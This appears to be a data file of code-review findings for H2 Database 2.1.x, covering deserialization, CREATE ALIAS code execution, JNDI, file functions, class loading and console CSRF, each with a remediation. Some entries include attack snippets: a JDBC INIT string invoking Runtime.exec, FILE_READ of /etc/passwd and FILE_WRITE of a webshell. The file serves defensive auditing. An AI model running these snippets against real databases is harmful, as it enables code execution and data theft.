  {id:"a0000005-0001-4000-8000-000000000001",title:"Unrestricted Java Deserialization in JdbcUtils.deserialize()",severity:"HIGH",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"JAVA_OBJECT type columns use ObjectInputStream.readObject() without any JEP 290 deserialization filter or class allowlist. Gadget chains on the classpath can achieve RCE.",affected_files:"h2/src/main/org/h2/util/JdbcUtils.java:404-434, h2/src/main/org/h2/mvstore/type/ObjectDataType.java:373-382",exploitation:"Insert crafted serialized Java objects via SQL into JAVA_OBJECT columns. When read back, gadget chains achieve RCE.",remediation:"Add JEP 290 deserialization filters to JdbcUtils.deserialize() and ObjectDataType.deserialize().",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:null,hackerone_id:null},
  {id:"a0000005-0002-4000-8000-000000000002",title:"Arbitrary Code Execution via CREATE ALIAS",severity:"HIGH",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"CREATE ALIAS myFunc AS $$ ...arbitrary Java... $$ compiles and executes arbitrary Java code on the server. CREATE TRIGGER can execute JavaScript via ScriptEngine. Requires ADMIN privilege but embedded mode user is admin by default.",affected_files:"h2/src/main/org/h2/command/ddl/CreateFunctionAlias.java:36, h2/src/main/org/h2/schema/FunctionAlias.java:97-103",exploitation:"jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS '...Runtime.exec...'",remediation:"Restrict CREATE ALIAS to a restrictive allowlist. Set h2.allowedClasses to a specific list.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:"CVE-2018-10054",hackerone_id:null},
  {id:"a0000005-0005-4000-8000-000000000005",title:"JNDI Lookup via java: Scheme",severity:"MEDIUM",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The java: scheme restriction blocks remote LDAP/RMI lookups (CVE-2021-42392 vector) but java:comp/env/... lookups are still permitted. In application server environments, LINKED TABLE syntax can still exploit local JNDI context.",affected_files:"h2/src/main/org/h2/util/JdbcUtils.java:318-325",exploitation:"Use LINKED TABLE with java:comp/env/... JNDI lookup in application server environment.",remediation:"Further restrict JNDI lookups or disable LINKED TABLE functionality.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:"CVE-2021-42392",hackerone_id:null},
  {id:"a0000005-0006-4000-8000-000000000006",title:"Unrestricted FILE_READ and FILE_WRITE Functions",severity:"MEDIUM",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"SELECT FILE_READ('/etc/passwd') reads any file. SELECT FILE_WRITE(X'...', '/tmp/webshell.jsp') writes arbitrary files. Requires ADMIN privilege but has no path allowlist.",affected_files:"h2/src/main/org/h2/expression/function/FileFunction.java:56-103",exploitation:"SQL queries using FILE_READ/FILE_WRITE to read sensitive files or write webshells.",remediation:"Add path allowlist for FILE_READ/FILE_WRITE or disable these functions.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:null,hackerone_id:null},
  {id:"a0000005-0009-4000-8000-000000000009",title:"Default h2.allowedClasses Permits All Class Loading",severity:"MEDIUM",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"h2.allowedClasses defaults to \"*\", allowing any Java class to be loaded via loadUserClass(). Used by CREATE ALIAS, CREATE TRIGGER, CREATE LINKED TABLE, and JNDI paths.",affected_files:"h2/src/main/org/h2/engine/SysProperties.java:53-57, h2/src/main/org/h2/util/JdbcUtils.java:144-211",exploitation:"Load arbitrary Java classes through CREATE ALIAS, CREATE TRIGGER, or LINKED TABLE.",remediation:"Change h2.allowedClasses default from \"*\" to a restrictive allowlist.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:null,hackerone_id:null},
  {id:"a0000005-0007-4000-8000-000000000007",title:"H2 Console Lacks CSRF Protection",severity:"MEDIUM",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The H2 Console has no CSRF tokens, no SameSite cookie attributes, and no X-Frame-Options headers. Session ID is passed as URL parameter (jsessionid). Login endpoint accepts credentials via POST without CSRF protection.",affected_files:"h2/src/main/org/h2/server/web/WebApp.java:221-283, h2/src/main/org/h2/server/web/WebThread.java:119-224",exploitation:"Cross-site request forgery attacks against authenticated H2 Console sessions.",remediation:"Add CSRF tokens, SameSite cookie attributes, and X-Frame-Options headers to the H2 Console.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:null,hackerone_id:null},
